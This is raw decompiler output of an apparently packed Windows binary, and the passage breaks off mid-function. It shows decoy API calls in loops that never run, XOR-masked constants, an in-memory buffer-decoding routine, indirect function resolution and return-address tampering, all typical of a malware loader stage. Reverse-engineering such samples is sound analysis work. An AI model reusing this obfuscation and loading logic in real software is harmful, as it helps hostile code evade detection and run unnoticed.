//----- (00403EEE) --------------------------------------------------------
int sub_403EEE()
{
  int (**v0)[484]; // eax
  int v1; // eax
  int v2; // esi
  int v3; // eax
  int v5; // [esp+30h] [ebp-8h]

  v0 = off_40A080;
  for ( dword_40AB0A = 0; (unsigned int)dword_40AB0A < 0x14; ++dword_40AB0A )
  {
    if ( dword_40AB0A == 24 )
      v0 = (int (**)[484])DestroyCaret();
  }
  v5 = (int)*v0;
  v1 = (int)*off_40A084;
  stru_40AAF6.left += *off_40ACA6[0];
  dword_40A2F0 = v5;
  v2 = 4 - v5 + v1;
  v3 = -4126;
  dword_40A2F4 = v2;
  if ( !v5 )
  {
    dword_40ABDA = -dword_40ABDA;
    v3 = -4127;
  }
  return (v3 ^ 0x3530) + 9519;
}
// 40A080: using guessed type int (**off_40A080)[484];
// 40A084: using guessed type int (__stdcall **off_40A084)(int, int);
// 40A2F0: using guessed type int dword_40A2F0;
// 40A2F4: using guessed type int dword_40A2F4;
// 40AB0A: using guessed type int dword_40AB0A;
// 40ABDA: using guessed type int dword_40ABDA;
// 40ACA6: using guessed type int *off_40ACA6[11];

//----- (00404004) --------------------------------------------------------
int sub_404004()
{
  int v0; // edx
  int v1; // ecx
  int v3; // [esp-1Ch] [ebp-70h]
  DWORD dwLanguageId; // [esp+2Ch] [ebp-28h]
  LPCVOID lpSource; // [esp+34h] [ebp-20h]
  va_list *nSize; // [esp+3Ch] [ebp-18h]
  int v7; // [esp+4Ch] [ebp-8h] BYREF
  int v8; // [esp+50h] [ebp-4h]

  v8 = -4127;
  v0 = -4127;
  v1 = 13616;
  for ( dword_40ABD2 = 0; (unsigned int)dword_40ABD2 < 0x19; ++dword_40ABD2 )
  {
    if ( dword_40ABD2 == 35 )
      FormatMessageA(0x48BCu, lpSource, 0x2D2Bu, dwLanguageId, Buffer, (DWORD)nSize, nSize);
  }
  v7 = (v1 ^ v0) + 9519;
  dword_40ABBE -= (int)&dword_40ABA2;
  dword_40ABBE ^= (unsigned int)&dword_40AB9E;
  dword_40ABBE -= (int)&dword_40AAF2;
  v8 = (int)off_40A2D8;
  v3 = *off_40A2D8[3];
  dword_40AB12 = ((unsigned int)&dword_40ABB6 & (unsigned int)&dword_40AB8A) - (_DWORD)&dword_40ABCE;
  return off_40A580(
           off_40A584,
           v3,
           (char *)off_40A2D8 + 318,
           4,
           dword_40A2F0,
           dword_40A2F4,
           (v1 ^ 0xFFFFEE21) + 9519,
           &v7);
}
// 404098: variable 'lpSource' is possibly undefined
// 404098: variable 'dwLanguageId' is possibly undefined
// 404098: variable 'nSize' is possibly undefined
// 4040A3: variable 'v1' is possibly undefined
// 4040A3: variable 'v0' is possibly undefined
// 40A2D8: using guessed type int **off_40A2D8;
// 40A2F0: using guessed type int dword_40A2F0;
// 40A2F4: using guessed type int dword_40A2F4;
// 40A580: using guessed type int (__cdecl *off_40A580)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 40A584: using guessed type int (__stdcall *off_40A584)(int, int, int);
// 40AAF2: using guessed type int dword_40AAF2;
// 40AB12: using guessed type int dword_40AB12;
// 40AB8A: using guessed type int dword_40AB8A;
// 40AB8E: using guessed type int dword_40AB8E;
// 40AB9E: using guessed type int dword_40AB9E;
// 40ABA2: using guessed type int dword_40ABA2;
// 40ABB6: using guessed type int dword_40ABB6;
// 40ABBE: using guessed type int dword_40ABBE;
// 40ABCE: using guessed type int dword_40ABCE;
// 40ABD2: using guessed type int dword_40ABD2;
// 40AD12: using guessed type int *off_40AD12[5];

//----- (0040419E) --------------------------------------------------------
int sub_40419E()
{
  int v0; // eax
  unsigned __int16 i; // ax
  int v3; // [esp+14h] [ebp-40h]
  int v4; // [esp+24h] [ebp-30h]
  int v5; // [esp+2Ch] [ebp-28h]
  _WORD *v6; // [esp+48h] [ebp-Ch] BYREF
  int v7; // [esp+4Ch] [ebp-8h]
  int v8; // [esp+50h] [ebp-4h]

  v7 = 4;
  v8 = 0;
  for ( dword_40AB86 = 28; dword_40AB86; --dword_40AB86 )
  {
    if ( dword_40AB86 == 30 )
      GetClipBox((HDC)0x30CE, &rect);
  }
  v0 = ++v8 << v7;
  *(_BYTE *)off_40AC6A[31] += 99;
  dword_40AB8E &= v3;
  v8 = v0 << v7 << v7 << v7;
  v7 = (int)**off_40A040;
  v5 = 33092;
  v6 = (_WORD *)(*(_DWORD *)v7 & ~(v8 - 1));
  stru_40AAF6.left = (unsigned int)&dword_40ABD2 & (unsigned int)&dword_40AB1A;
  v7 = (int)&v6;
  for ( i = *v6 - 559; (i ^ 0x330) != 23342; i = **(_WORD **)v7 - 559 )
  {
    *(_DWORD *)v7 -= v8;
    dword_40AB46 = (unsigned __int16)dword_40AB46 - 5589;
    v5 &= v4;
  }
  return *(_DWORD *)v7;
}
// 404270: variable 'v3' is possibly undefined
// 404345: variable 'v4' is possibly undefined
// 40A040: using guessed type void ***off_40A040;
// 40AB1A: using guessed type int dword_40AB1A;
// 40AB46: using guessed type int dword_40AB46;
// 40AB86: using guessed type int dword_40AB86;
// 40AB8E: using guessed type int dword_40AB8E;
// 40ABD2: using guessed type int dword_40ABD2;
// 40AC6A: using guessed type int *off_40AC6A[2];

//----- (00404365) --------------------------------------------------------
int __stdcall sub_404365(int a1, unsigned int a2)
{
  int v2; // eax
  __int16 v3; // ax
  __int16 v4; // cx
  int result; // eax
  int v6; // [esp+118h] [ebp-D4h]
  unsigned __int8 v7; // [esp+13Ch] [ebp-B0h]
  int v8; // [esp+160h] [ebp-8Ch]
  int v9; // [esp+17Ch] [ebp-70h]
  unsigned int i; // [esp+198h] [ebp-54h]
  __int16 v11[3]; // [esp+19Ch] [ebp-50h] BYREF
  int v12; // [esp+1A2h] [ebp-4Ah]
  __int16 v13; // [esp+1A6h] [ebp-46h]
  __int16 v14; // [esp+1A8h] [ebp-44h]
  __int16 v15; // [esp+1AAh] [ebp-42h]
  __int16 v16; // [esp+1ACh] [ebp-40h]
  __int16 v17; // [esp+1AEh] [ebp-3Eh]
  __int16 v18; // [esp+1B0h] [ebp-3Ch]
  __int16 v19; // [esp+1B2h] [ebp-3Ah]
  __int16 v20; // [esp+1B4h] [ebp-38h]
  __int16 v21; // [esp+1B6h] [ebp-36h]
  __int16 v22; // [esp+1B8h] [ebp-34h]
  int v23; // [esp+1BAh] [ebp-32h]
  __int16 v24[4]; // [esp+1C0h] [ebp-2Ch] BYREF
  LPCPROPSHEETHEADERA v25; // [esp+1C8h] [ebp-24h]
  __int16 v26; // [esp+1CCh] [ebp-20h]
  __int16 v27; // [esp+1CEh] [ebp-1Eh]
  __int16 v28; // [esp+1D0h] [ebp-1Ch]
  __int16 v29; // [esp+1D2h] [ebp-1Ah]
  COLORREF crMask; // [esp+1D4h] [ebp-18h]
  HBITMAP hbmImage; // [esp+1D8h] [ebp-14h]
  HIMAGELIST himl; // [esp+1DCh] [ebp-10h]
  __int16 v33; // [esp+1E0h] [ebp-Ch]
  int v34; // [esp+1E4h] [ebp-8h]
  int v35; // [esp+1E8h] [ebp-4h]

  v2 = *(int *)((char *)&dword_40A49C + a1);
  for ( i = 0; i < 0x12; ++i )
    ;
  v35 = -4127;
  v34 = (v2 ^ 0x3530) + 9519;
  *off_40AD56[0] ^= 0x1116u;
  word_40A340[(v2 ^ 0x3530) + 9519] = 0;
  v24[0] = -755;
  *off_40AD16[0] += v6;
  v24[1] = -287;
  *(_BYTE *)off_40AC6A[44] += 118;
  v24[2] = -653;
  v24[3] = -284;
  v25 = (LPCPROPSHEETHEADERA)-18481916;
  dword_40AB4E &= v8;
  v26 = -766;
  v27 = -282;
  v28 = -651;
  v29 = -281;
  crMask = -18285288;
  v3 = -280;
  dword_40AB52 += (int)&dword_40AB0A + ((unsigned int)dword_40AB2E > 0x3530);
  dword_40AB52 &= (unsigned int)&dword_40AB7A;
  hbmImage = (HBITMAP)-18219295;
  himl = (HIMAGELIST)314971077;
  dword_40AAEE |= v7;
  v33 = -280;
  v11[0] = -755;
  *(_DWORD *)dword_40AB3A ^= v9;
  v11[1] = -287;
  v13 = -283;
  v14 = -762;
  v15 = -282;
  v16 = -753;
  v17 = -281;
  v20 = -287;
  v4 = -279;
  v18 = -744;
  for ( dword_40AB6A = 0; (unsigned int)dword_40AB6A < 0x11; ++dword_40AB6A )
  {
    if ( dword_40AB6A == 24 )
      v3 = ImageList_AddMasked(himl, hbmImage, crMask);
  }
  v21 = v4;
  v11[2] = -653;
  v12 = -49414428;
  *off_40AD62[0] |= 0x7B39u;
  v19 = v3;
  v22 = -31227;
  v23 = -18317562;
  sub_40672B((char *)off_40A584, *off_40A2D8[3], (int)v24, 3);
  if ( (int)v11 <= 26650 )
    dword_40ABB6 = (__PAIR64__(dword_40ABB6, v11) - __PAIR64__((unsigned __int8)dword_40ABA2, 26650)) >> 32;
  *(_BYTE *)off_40AC6A[0] |= 0x19u;
  result = sub_40672B((char *)off_40A584, *off_40A2D8[3], (int)v11, 1);
  dword_40ABDA = (int)&BytesRead + (_DWORD)&dword_40AB9E + (dword_40AB4A < a2);
  if ( result != (*(int *)((char *)&dword_40A49C + a2) ^ 0x3530)
               + (*(int *)((char *)&dword_40A49C + a1) ^ 0x3530)
               + 19038 )
  {
    *(_DWORD *)dword_40A4D8 = (v35 ^ 0x3530) + 9519;
    result = (v35 ^ 0x3530) + 9519;
    *off_40A2D8[3] = result;
  }
  return result;
}
// 4043A3: conditional instruction was optimized away because of '%var_54.4<12u'
// 40449E: variable 'v6' is possibly undefined
// 4044D4: variable 'v8' is possibly undefined
// 404562: variable 'v7' is possibly undefined
// 40458F: variable 'v9' is possibly undefined
// 404619: variable 'v4' is possibly undefined
// 40A2D8: using guessed type int **off_40A2D8;
// 40A340: using guessed type __int16 word_40A340[];
// 40A49C: using guessed type int dword_40A49C;
// 40A4D8: using guessed type int dword_40A4D8;
// 40AAEE: using guessed type int dword_40AAEE;
// 40AB0A: using guessed type int dword_40AB0A;
// 40AB2E: using guessed type int dword_40AB2E;
// 40AB4A: using guessed type int dword_40AB4A;
// 40AB4E: using guessed type int dword_40AB4E;
// 40AB52: using guessed type int dword_40AB52;
// 40AB6A: using guessed type int dword_40AB6A;
// 40AB7A: using guessed type int dword_40AB7A;
// 40AB86: using guessed type int dword_40AB86;
// 40AB9E: using guessed type int dword_40AB9E;
// 40ABA2: using guessed type int dword_40ABA2;
// 40ABB6: using guessed type int dword_40ABB6;
// 40ABDA: using guessed type int dword_40ABDA;
// 40AC6A: using guessed type int *off_40AC6A[2];
// 40AC9A: using guessed type int *off_40AC9A[14];
// 40AD16: using guessed type int *off_40AD16[4];
// 40AD56: using guessed type int *off_40AD56[5];
// 40AD62: using guessed type int *off_40AD62[2];

//----- (004047C6) --------------------------------------------------------
int sub_4047C6()
{
  int v0; // eax
  unsigned int v1; // edx
  unsigned int v2; // ebx
  int v4; // [esp+34h] [ebp-B4h]
  int v5; // [esp+40h] [ebp-A8h]
  int v6; // [esp+4Ch] [ebp-9Ch]
  int v7; // [esp+68h] [ebp-80h]
  __int16 v8; // [esp+74h] [ebp-74h]
  unsigned int v9; // [esp+A8h] [ebp-40h]
  int iHatch; // [esp+C0h] [ebp-28h]
  int iHatcha; // [esp+C0h] [ebp-28h]
  COLORREF color; // [esp+D8h] [ebp-10h]
  COLORREF colora; // [esp+D8h] [ebp-10h]
  char v14; // [esp+E7h] [ebp-1h]

  dword_40ABDA = 0;
  do
  {
    if ( ++dword_40ABDA == 35 )
      CreateHatchBrush(iHatch, color);
  }
  while ( (unsigned int)dword_40ABDA < 0x1D );
  *(_BYTE *)off_40AC6A[25] |= 0x53u;
  if ( sub_403EEE() )
  {
    sub_404004();
    dword_40AB42 -= v7;
    v0 = dword_40A2F0;
    colora = -9519;
    v1 = 0;
    iHatcha = dword_40A2F4;
    if ( dword_40A2F4 )
    {
      do
      {
        v6 &= dword_40AB9A;
        --v8;
        v14 = *(_BYTE *)(v1 + v0);
        v9 = 0;
        do
        {
          if ( ++v9 == 22 )
            v0 = SetWindowRgn((HWND)0x3B44, (HRGN)0x7CDD, iHatcha);
        }
        while ( v9 < 0x10 );
        v2 = v1;
        dword_40AB1A |= (unsigned int)&dword_40AB16;
        LOBYTE(v2) = *(_BYTE *)(v1 + v0);
        *(_BYTE *)(v1 + v0) = 0;
        dword_40AB52 = *off_40ACAA[0] + (dword_40ABD6 < v2) + (unsigned __int8)dword_40AB52;
        ++*(_BYTE *)(v1 + v0);
        dword_40AB6E |= (unsigned int)&dword_40AB0E;
        dword_40AB6E += (int)&BytesRead;
        dword_40AB6E += (int)&rect.bottom;
        *(_BYTE *)(v1 + v0) += __ROR1__(v14 - 47, 1);
        --*(_BYTE *)(v1 + v0);
        v5 ^= v4;
        colora = colora - 9518 + 9519;
        v1 = colora + 9519;
      }
      while ( colora + 9519 != iHatcha );
    }
  }
  return 0;
}
// 4047FD: variable 'iHatch' is possibly undefined
// 4047FD: variable 'color' is possibly undefined
// 4048A2: variable 'v7' is possibly undefined
// 404901: variable 'v6' is possibly undefined
// 404913: variable 'v8' is possibly undefined
// 4049ED: variable 'v1' is possibly undefined
// 404A88: variable 'v4' is possibly undefined
// 404A88: variable 'v5' is possibly undefined
// 40AB0E: using guessed type int dword_40AB0E;
// 40AB16: using guessed type int dword_40AB16;
// 40AB1A: using guessed type int dword_40AB1A;
// 40AB42: using guessed type int dword_40AB42;
// 40AB52: using guessed type int dword_40AB52;
// 40AB6A: using guessed type int dword_40AB6A;
// 40AB6E: using guessed type int dword_40AB6E;
// 40AB96: using guessed type int dword_40AB96;
// 40AB9A: using guessed type int dword_40AB9A;
// 40ABD6: using guessed type int dword_40ABD6;
// 40ABDA: using guessed type int dword_40ABDA;
// 40AC6A: using guessed type int *off_40AC6A[2];
// 40ACAA: using guessed type int *off_40ACAA[10];

//----- (00404AB9) --------------------------------------------------------
int sub_404AB9()
{
  unsigned int i; // edx
  int v1; // edi
  int v2; // ecx
  bool v3; // cf
  int v4; // ecx
  __int16 v5; // ax
  __int16 v6; // ax
  int v7; // ecx
  int v8; // ecx
  char v9; // al
  unsigned int v11; // [esp+0h] [ebp-54h]
  unsigned __int64 v12; // [esp+4h] [ebp-50h]
  unsigned int v13; // [esp+Ch] [ebp-48h]
  __int16 v14; // [esp+18h] [ebp-3Ch]
  int v15; // [esp+1Ch] [ebp-38h]
  int v16; // [esp+20h] [ebp-34h]
  HDC hdc; // [esp+38h] [ebp-1Ch]
  int v18; // [esp+50h] [ebp-4h]

  for ( i = 5; i < 0x14; ++i )
  {
    v15 ^= *(_DWORD *)off_40AC7A;
    if ( dword_40A090 )
      break;
    for ( dword_40ABCE = 0; (unsigned int)dword_40ABCE < 0x12; ++dword_40ABCE )
    {
      if ( dword_40ABCE == 20 )
        CreateHalftonePalette(hdc);
    }
    byte_40A4D7[i] = (byte_40A4D7[i] ^ 0x60) + 50;
  }
  v1 = 0;
  if ( !*off_40A2D8[3] )
    v1 = sub_40419E();
  v2 = -4127;
  do
  {
    if ( (int)v12 < 29205 )
    {
      v3 = v12 < __PAIR64__(v11, 29205);
      HIDWORD(v12) = (v12 - __PAIR64__(v11, 29205)) >> 32;
    }
    else
    {
      v3 = 0;
      v14 &= dword_40AB96;
    }
    v14 += v13 + v3;
    v4 = v2 ^ 0x3530;
    v18 = 2 * v4 + 19038;
    v5 = *(__int16 *)((char *)&word_40A4BC + v18) ^ 0x330;
    dword_40AB6A += *off_40AC82[0];
    v6 = v5 + 559;
    v7 = v4 + 1;
    if ( __OFSUB__(v13, 7846) )
      *(_BYTE *)off_40ACBA[0] |= 0x7Bu;
    else
      dword_40AB9E += dword_40AB4A + (v13 < 0x1EA6);
    *(_DWORD *)Buffer &= v16;
    v2 = v7 ^ 0x3530;
    *(__int16 *)((char *)&word_40A4C4 + v18) = v6;
  }
  while ( v2 != -4124 );
  if ( v1 )
  {
    v8 = 9;
    do
    {
      v9 = aZZsE[v8 - 1];
      stru_40AAF6.top |= (unsigned int)&dword_40AB92;
      stru_40AAF6.top += (LONG)&dword_40AB1E;
      stru_40AAF6.top ^= (unsigned int)&dword_40ABB2;
      byte_40A640[v8-- - 9] = (v9 ^ 0x60) + 50;
    }
    while ( v8 );
    *off_40A2D8[3] = v1;
  }
  return v18;
}
// 404AC7: variable 'v15' is possibly undefined
// 404B0F: variable 'hdc' is possibly undefined
// 404B1A: variable 'i' is possibly undefined
// 404B77: variable 'v12' is possibly undefined
// 404B84: variable 'v14' is possibly undefined
// 404B91: variable 'v11' is possibly undefined
// 404B9D: variable 'v13' is possibly undefined
// 404C07: variable 'v16' is possibly undefined
// 40A090: using guessed type int dword_40A090;
// 40A2D8: using guessed type int **off_40A2D8;
// 40A4BC: using guessed type __int16 word_40A4BC;
// 40A4C4: using guessed type __int16 word_40A4C4;
// 40AB1E: using guessed type int dword_40AB1E;
// 40AB4A: using guessed type int dword_40AB4A;
// 40AB6A: using guessed type int dword_40AB6A;
// 40AB92: using guessed type int dword_40AB92;
// 40AB96: using guessed type int dword_40AB96;
// 40AB9E: using guessed type int dword_40AB9E;
// 40ABB2: using guessed type int dword_40ABB2;
// 40ABCE: using guessed type int dword_40ABCE;
// 40AC7A: using guessed type void *off_40AC7A;
// 40AC82: using guessed type int *off_40AC82[20];
// 40ACBA: using guessed type int *off_40ACBA[6];

//----- (00404C90) --------------------------------------------------------
int __usercall sub_404C90@<eax>(int a1@<ebp>, unsigned int a2@<edi>, unsigned int *a3@<esi>)
{
  unsigned int v3; // ecx
  int result; // eax

  do
  {
    *a3 = 1;
    if ( a2 != 1 )
    {
      do
      {
        v3 = *a3;
        if ( *a3 <= a2 )
        {
          if ( v3 )
          {
            for ( dword_40ABBA = 17; dword_40ABBA; --dword_40ABBA )
            {
              if ( dword_40ABBA == 25 )
                DefWindowProcA(*(HWND *)(a1 - 20), *(_DWORD *)(a1 - 24), *(_DWORD *)(a1 - 12), 27810);
            }
            *(_BYTE *)off_40ACA6[0] >>= 1;
            *a3 = a2 / 0x101 + v3 + 1;
          }
          else
          {
            *a3 = a2;
          }
        }
        else
        {
          *a3 = v3 - 1;
        }
      }
      while ( *a3 != a2 );
    }
    result = InterlockedExchangeAdd(&Addend, 7734903) + 7734903;
  }
  while ( result != Addend );
  return result;
}
// 404D1A: variable 'v3' is possibly undefined
// 40ABBA: using guessed type int dword_40ABBA;
// 40ACA6: using guessed type int *off_40ACA6[11];

//----- (00404D4D) --------------------------------------------------------
int sub_404D4D()
{
  int v0; // edx
  int v1; // ecx
  int v2; // eax
  unsigned int i; // [esp+5Ch] [ebp-18h]
  int v5; // [esp+70h] [ebp-4h] BYREF
  char *retaddr; // [esp+78h] [ebp+4h] BYREF

  for ( i = 0; i < 0x1E; ++i )
    ;
  dword_40A0EC = *(&dword_40A314 + 1);
  dword_40A0F0 = *(&dword_40A314 + 2);
  dword_40A0F4 = *(&dword_40A314 + 3);
  sub_403C31((int)&v5, *(_DWORD *)dword_40A314, (int)off_40A2FC);
  if ( sub_404EEB(v1, v0) )
  {
    v5 = 0;
    dword_40A098 += 6780279;
  }
  else
  {
    dword_40AAF2 = (unsigned __int8)dword_40AAF2 - 1;
    v2 = *off_40A2D8[15];
    dword_40ABDE = ~dword_40ABDE;
    v5 = v2;
  }
  dword_40A2F8 = (int)&retaddr;
  retaddr += dword_40A100;
  return v5;
}
// 404DBF: conditional instruction was optimized away because of '%var_18.4<1Eu'
// 404E35: variable 'v1' is possibly undefined
// 404E35: variable 'v0' is possibly undefined
// 40A098: using guessed type int dword_40A098;
// 40A0EC: using guessed type int dword_40A0EC;
// 40A100: using guessed type int dword_40A100;
// 40A2D8: using guessed type int **off_40A2D8;
// 40A2F8: using guessed type int dword_40A2F8;
// 40A2FC: using guessed type char *off_40A2FC;
// 40A314: using guessed type int dword_40A314;
// 40AAF2: using guessed type int dword_40AAF2;
// 40AB12: using guessed type int dword_40AB12;
// 40ABDE: using guessed type int dword_40ABDE;

//----- (00404EEB) --------------------------------------------------------
int __fastcall sub_404EEB(int a1, int a2)
{
  int v2; // ebx
  int v3; // eax
  int v4; // eax
  unsigned int v6; // [esp+14h] [ebp-38h]
  unsigned int v7; // [esp+20h] [ebp-2Ch]
  void (__stdcall *v8)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // [esp+38h] [ebp-14h]
  _DWORD *v9; // [esp+40h] [ebp-Ch]
  char *retaddr; // [esp+50h] [ebp+4h] BYREF

  v9 = (_DWORD *)dword_40A304;
  dword_40AB42 = 0;
  do
  {
    if ( ++dword_40AB42 == 32 )
      CreateDCW(&pwszDevice[12], pwszDevice, &pszPort, (const DEVMODEW *)0x1DDC);
  }
  while ( (unsigned int)dword_40AB42 < 0x17 );
  v2 = dword_40A308;
  v8 = (void (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))dword_40A30C;
  v3 = sub_4039FA(a1, a2, (int)off_40A2D8, v9);
  dword_40AB6E ^= (unsigned int)&rect.right;
  dword_40AB6E -= (int)&dword_40AB22;
  if ( v3 )
  {
    v4 = -4126;
  }
  else
  {
    sub_405435((int)off_40A2D8, v2, v8, 203286);
    dword_40ABD2 -= dword_40AB16;
    dword_40A300 = (int)&retaddr;
    retaddr += dword_40A100;
    if ( (int)(v6 - 3155) >= 0 )
      *off_40ACCA[0] = (__PAIR64__(*off_40ACCA[0], v6) - __PAIR64__(v7, 3155)) >> 32;
    v4 = -4127;
  }
  return (v4 ^ 0x3530) + 9519;
}
// 404F8D: variable 'a1' is possibly undefined
// 404F8D: variable 'a2' is possibly undefined
// 405019: variable 'v6' is possibly undefined
// 405045: variable 'v7' is possibly undefined
// 40A100: using guessed type int dword_40A100;
// 40A2D8: using guessed type int **off_40A2D8;
// 40A300: using guessed type int dword_40A300;
// 40A304: using guessed type int dword_40A304;
// 40A308: using guessed type int dword_40A308;
// 40A30C: using guessed type int dword_40A30C;
// 40AB16: using guessed type int dword_40AB16;
// 40AB22: using guessed type int dword_40AB22;
// 40AB42: using guessed type int dword_40AB42;
// 40AB6E: using guessed type int dword_40AB6E;
// 40ABBE: using guessed type int dword_40ABBE;
// 40ABD2: using guessed type int dword_40ABD2;
// 40ABD6: using guessed type int dword_40ABD6;
// 40AC6A: using guessed type int *off_40AC6A[2];
// 40ACCA: using guessed type int *off_40ACCA[2];

//----- (00405060) --------------------------------------------------------
int sub_405060()
{
  int *v0; // ecx
  int i; // ecx
  int v2; // ebx
  int v3; // eax
  bool v4; // cf
  int v6; // [esp-8h] [ebp-48h]
  int v7; // [esp+4h] [ebp-3Ch]
  int v8; // [esp+8h] [ebp-38h]
  int v9; // [esp+Ch] [ebp-34h]
  unsigned int v10; // [esp+10h] [ebp-30h]
  int v11; // [esp+14h] [ebp-2Ch]
  int nSize; // [esp+30h] [ebp-10h]
  int nSavedDC; // [esp+34h] [ebp-Ch]
  unsigned __int64 v14; // [esp+38h] [ebp-8h]

  sub_404AB9();
  HIDWORD(v14) = 0;
  do
  {
    if ( ++HIDWORD(v14) == 38 )
      DestroyCursor((HCURSOR)0x507A);
  }
  while ( HIDWORD(v14) < 0x1F );
  nSize = 384;
  v9 = -4127;
  dword_40ABE2 = *off_40AD06[0] | (unsigned __int8)dword_40ABE2;
  do
  {
    if ( dword_40A090 )
      break;
    v0 = off_40A2D8[3];
    if ( *v0 )
      dword_40A4EC = sub_40672B((char *)off_40A584, *v0, (int)(off_40A2D8 + 20), 1);
    if ( dword_40A4EC )
    {
      v11 = 0;
      for ( i = -4127; ; i = (v2 + 1) ^ 0x3530 )
      {
        if ( __SETP__(v14, 20431) )
        {
          v4 = 0;
          LODWORD(v14) = (unsigned __int16)dword_40ABC6 & (unsigned __int8)v14;
        }
        else
        {
          v4 = v14 < __PAIR64__(dword_40AB9A, 20431);
          HIDWORD(v14) = (v14 - __PAIR64__(dword_40AB9A, 20431)) >> 32;
        }
        nSavedDC += (unsigned __int16)dword_40AB6E + v4;
        if ( i == -4143 )
          break;
        v2 = i ^ 0x3530;
        *(_DWORD *)Buffer &= (unsigned int)&dword_40ABD2;
        *(_DWORD *)Buffer -= &dword_40AB6E;
        v10 = 8 * (((i ^ 0x3530u) + 9519) % 4);
        nSize = 1893;
        if ( stricmp(String1, String2) )
          sub_40672B((char *)off_40A584, dword_40A4EC, (int)&unk_40A4F0, 3);
        v3 = -4591;
        do
        {
          if ( v3 == -4554 )
          {
            for ( dword_40AB82 = 0; (unsigned int)dword_40AB82 < 0x1B; ++dword_40AB82 )
            {
              if ( dword_40AB82 == 29 )
                RestoreDC((HDC)0x3015, nSavedDC);
            }
            v6 = *off_40A2D8[3];
            dword_40AB2A -= *off_40AC9E[0];
            dword_40A514 = ((int (__cdecl *)(int, void *))v11)(v6, &unk_40A638);
          }
          else if ( v3 == -4575 )
          {
            v11 = sub_40672B((char *)off_40A584, *(_DWORD *)off_40A11C, (int)&unk_40A1A4, 2);
          }
          LODWORD(v14) = (unsigned __int16)dword_40AB96 + (unsigned __int8)v14;
          v3 = --v10 ^ 0x3530;
        }
        while ( (v3 ^ 0x3530) != -9519 );
        nSavedDC = 28409;
        sub_404365(v8, 8 * (((v7 ^ 0x3530u) + 9519) % ((v11 ^ 0x3530u) + 9519)));
      }
    }
    for ( dword_40ABD6 = 31; dword_40ABD6; --dword_40ABD6 )
    {
      if ( dword_40ABD6 == 43 )
        GetComputerNameW(&word_40ABAA, (LPDWORD)nSize);
    }
    v9 = ((v9 ^ 0x3530) + 1) ^ 0x3530;
  }
  while ( v9 != -4591 );
  *off_40ACA2[0] -= 20124;
  return 1;
}
// 4052D1: variable 'v14' is possibly undefined
// 405349: variable 'v8' is possibly undefined
// 40532E: variable 'v7' is possibly undefined
// 405393: variable 'nSavedDC' is possibly undefined
// 40A090: using guessed type int dword_40A090;
// 40A11C: using guessed type void *off_40A11C;
// 40A2D8: using guessed type int **off_40A2D8;
// 40A4EC: using guessed type int dword_40A4EC;
// 40A514: using guessed type int dword_40A514;
// 40AAF2: using guessed type int dword_40AAF2;
// 40AB2A: using guessed type int dword_40AB2A;
// 40AB6E: using guessed type int dword_40AB6E;
// 40AB82: using guessed type int dword_40AB82;
// 40AB8A: using guessed type int dword_40AB8A;
// 40AB96: using guessed type int dword_40AB96;
// 40AB9A: using guessed type int dword_40AB9A;
// 40ABBE: using guessed type int dword_40ABBE;
// 40ABC6: using guessed type int dword_40ABC6;
// 40ABD2: using guessed type int dword_40ABD2;
// 40ABD6: using guessed type int dword_40ABD6;
// 40ABE2: using guessed type int dword_40ABE2;
// 40AC9E: using guessed type int *off_40AC9E[13];
// 40ACA2: using guessed type int *off_40ACA2[12];
// 40AD06: using guessed type int *off_40AD06[8];

//----- (00405435) --------------------------------------------------------
unsigned int *__stdcall sub_405435(int a1, int a2, void (__stdcall *a3)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD), int a4)
{
  int v4; // eax
  unsigned int *result; // eax
  unsigned int v6; // [esp+0h] [ebp-88h]
  unsigned int i; // [esp+4Ch] [ebp-3Ch]
  unsigned int retaddr; // [esp+8Ch] [ebp+4h] BYREF
  unsigned int v9; // [esp+98h] [ebp+10h]

  if ( a4 == 549991 )
  {
    a3(off_40A580, off_40A584, dword_40A0EC, dword_40A0F0, dword_40A0F4, a2, off_40A2D8);
  }
  else if ( a4 == 203286 )
  {
    sub_405435(a1, a2, a3, 394293);
  }
  else
  {
    for ( i = 0; i < 0x10; ++i )
      ;
    if ( *off_40A2D8[3] && !dword_40A090 )
      sub_4047C6();
    sub_405435(a1, a2, a3, 549991);
  }
  dword_40ABD6 -= 14762;
  v4 = dword_40A100;
  *(_DWORD *)off_40ACDA = (__PAIR64__(*(_DWORD *)off_40ACDA, dword_40A100) - (v6 | 0x356400000000i64)) >> 32;
  v9 = retaddr + v4;
  result = &retaddr;
  retaddr ^= v9;
  return result;
}
// 405499: conditional instruction was optimized away because of '%var_3C.4<10u'
// 4055CF: returning address of temporary local variable '%" r"'
// 405593: variable 'v6' is possibly undefined
// 40A090: using guessed type int dword_40A090;
// 40A0EC: using guessed type int dword_40A0EC;
// 40A100: using guessed type int dword_40A100;
// 40A2D8: using guessed type int **off_40A2D8;
// 40A580: using guessed type int (__cdecl *off_40A580)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 40AB46: using guessed type int dword_40AB46;
// 40ABD6: using guessed type int dword_40ABD6;
// 40ACDA: using guessed type void *off_40ACDA;

//----- (004055DB) --------------------------------------------------------
int __userpurge sub_4055DB@<eax>(char a1@<al>, unsigned __int8 a2)
{
  bool v2; // zf
  int v3; // eax
  DWORD dwExitCode; // [esp+0h] [ebp-1Ch]
  int i; // [esp+10h] [ebp-Ch]

  v2 = a1 == (char)a2;
  v3 = -4127;
  if ( v2 )
  {
    for ( i = 19; i; --i )
    {
      if ( i == 22 )
        TerminateThread((HANDLE)0x1E09, dwExitCode);
    }
    v3 = -4126;
  }
  return (v3 ^ 0x3530) + 9519;
}
// 405626: variable 'dwExitCode' is possibly undefined
// 405631: variable 'i' is possibly undefined

//----- (0040564B) --------------------------------------------------------
int __usercall sub_40564B@<eax>(int a1@<eax>, unsigned int a2@<ebx>, unsigned int a3@<edi>)
{
  int v4; // ecx
  int v5; // ecx
  unsigned int v6; // ecx
  bool v7; // cf
  int v8; // [esp+38h] [ebp-C0h]
  unsigned int v9; // [esp+80h] [ebp-78h]
  unsigned int v10; // [esp+B8h] [ebp-40h]
  unsigned int i; // [esp+CCh] [ebp-2Ch]
  unsigned int *v12; // [esp+D0h] [ebp-28h]
  int v13; // [esp+D8h] [ebp-20h]
  _DWORD *v14; // [esp+E0h] [ebp-18h]
  int v15; // [esp+E4h] [ebp-14h]
